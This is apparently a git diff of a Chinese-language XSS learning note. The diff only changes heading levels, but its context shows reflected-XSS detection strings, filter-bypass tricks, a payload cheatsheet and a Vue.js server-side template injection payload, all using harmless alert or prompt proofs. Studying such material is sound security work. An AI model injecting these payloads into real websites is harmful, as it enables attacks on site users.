@@ -1,4 +1,4 @@
-## Cross-Site Scripting  
+# Cross-Site Scripting  
 [同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
 1. reflected xss (非持久型):    
   
@@ -16,7 +16,7 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
 *  [Vue.js](#Vuejs-serverside-template-xss)  
 *  [Reference](#Reference)
 
-## XSS detection
+# XSS detection
 這裡先不談XSS探針...  
 我習慣直接注入sciprt語句作測試，常見語句如下:  
 ```js
@@ -27,7 +27,7 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
 1. 網頁不存在可利用的xss漏洞，可能注入點直接將值插入網頁作為內容  
 2. 惡意代碼被過濾掉，或者轉譯了 -> 這種情況下就要分析有沒有代替字元來繞過過濾名單，或者繞過轉譯！
 
-## 常見限制and對抗手勢
+# 常見限制and對抗手勢
 * 大小寫混用  
 * toUpperCase()  
 ```js
@@ -72,7 +72,7 @@ cript:
 alert(/1/);">
 ```
 
-## 正規表達式
+# 正規表達式
 js中會用正規表達式來過濾危險字符  
 ```js
 /g -> 全局匹配
@@ -81,7 +81,7 @@ js中會用正規表達式來過濾危險字符
 參考如下文件：  
 [Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
 
-## 攻擊手勢  
+# 攻擊手勢  
 * script  
 ```js
 <script>a=prompt;a(1)</script>
@@ -102,7 +102,7 @@ js中會用正規表達式來過濾危險字符
 // 這種payload也可以繞過括號過濾
 ```
 
-## Cheatsheet
+# Cheatsheet
 ```php
 </script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
 </script>"><script>prompt(1)</script>
@@ -136,14 +136,14 @@ js中會用正規表達式來過濾危險字符
 上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
 [Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
 
-## Vuejs serverside template xss
+# Vuejs serverside template xss
 ```{{ your code run here! }}```  
 ```js
 {{ constructor.constructor("alert('xss')")() }}
 ```
 [Here is detail!](https://github.com/dotboris/vuejs-serverside-template-xss)
 
-## Reference
+# Reference
 1. The Web Application Hacker's Handbook  
 2. [看雪](https://www.kanxue.com)  
 3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
